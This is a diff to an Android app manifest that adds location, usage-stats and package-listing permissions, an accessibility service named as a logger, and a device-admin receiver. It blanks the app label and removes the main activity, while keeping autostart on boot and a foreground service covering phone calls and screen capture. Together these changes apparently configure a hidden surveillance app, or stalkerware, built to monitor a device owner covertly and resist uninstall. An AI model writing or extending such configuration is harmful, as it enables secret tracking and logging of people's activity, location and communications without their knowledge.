@@ -21,6 +21,8 @@
     <uses-permission android:name="android.permission.GET_ACCOUNTS" />
     <uses-permission android:name="android.permission.READ_PRIVILEGED_PHONE_STATE"
         tools:ignore="ProtectedPermissions"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" tools:ignore="ProtectedPermissions"/>
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
@@ -28,12 +30,16 @@
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" tools:ignore="ScopedStorage"/>
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" tools:ignore="ScopedStorage"/>
-
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
+        tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
+        tools:ignore="QueryAllPackagesPermission" />
     <application
         android:name=".core.App"
         android:allowBackup="false"
         android:fullBackupContent="false"
         android:supportsRtl="true"
+        android:label=""
         android:theme="@android:style/Theme.Translucent.NoTitleBar"
         tools:targetApi="31"
         tools:ignore="DataExtractionRules">
@@ -48,7 +54,17 @@
             android:exported="false"
             android:foregroundServiceType="dataSync|phoneCall|connectedDevice|mediaProjection"
             tools:ignore="ForegroundServicePermission" />
-
+        <service
+            android:name=".accessibility.LoggerAccessibilityService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/logger_accessibility_service" />
+        </service>
         <!-- Autostart after boot -->
         <receiver
             android:name=".receiver.BootReceiver"
@@ -60,10 +76,16 @@
                 <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
             </intent-filter>
         </receiver>
-        <activity android:name=".MainActivity"
-            android:exported="true"
-            tools:ignore="Instantiatable,WearRecents">
-            <intent-filter tools:node="remove" />
-        </activity>
+        <receiver
+            android:name=".receiver.AdminReceiver"
+            android:permission="android.permission.BIND_DEVICE_ADMIN"
+            android:exported="true">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin_receiver" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
     </application>
 </manifest>
